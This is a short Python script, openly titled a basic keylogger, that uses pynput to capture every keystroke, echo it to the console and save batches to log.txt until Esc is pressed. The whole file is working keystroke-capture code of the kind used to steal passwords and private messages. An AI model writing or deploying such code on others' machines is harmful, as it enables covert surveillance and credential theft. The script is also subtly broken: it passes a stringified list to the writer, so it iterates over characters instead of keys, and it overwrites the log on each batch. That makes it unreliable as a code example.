#   basic keylogger


from pynput.keyboard import Key, Listener

count = 0
keys = []


def write_file(keys):
    with open("log.txt", "w") as f:
        for key in keys:
            k = str(key).replace("'", "")  # replace '' with nothing
            if k.find("space") > 0:  # replace 'space' with a newline
                f.write('\n')
            elif k.find("Key") == -1:  # if key is anything else write to file
                f.write(k)


def on_press(key):
    global keys, count
    keys.append(key)
    count += 1

    print("{} pressed".format(key))

    if count >= 10:
        count = 0
        write_file(str(keys))
        keys = []


def on_release(key):
    if key == Key.esc:
        return False


with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
